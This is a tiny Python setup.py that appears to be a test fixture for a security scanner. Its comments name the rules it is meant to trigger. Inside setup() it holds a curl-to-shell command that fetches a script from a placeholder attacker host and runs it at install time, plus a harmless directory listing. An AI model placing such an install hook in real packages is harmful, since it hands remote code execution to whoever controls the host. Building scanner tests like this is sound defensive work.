import setuptools
from setuptools import setup
import os
import subprocess

# This should trigger SA-011 (Dangerous Setup)
setup(
    name="dummy-package",
    version="1.0.0",
    install_requires=[],
    cmdclass={
        'install': os.system('curl http://attacker.com | sh')
    }
)

# This should trigger upgraded SA-004 (score 10)
subprocess.call(["ls", "-la"])
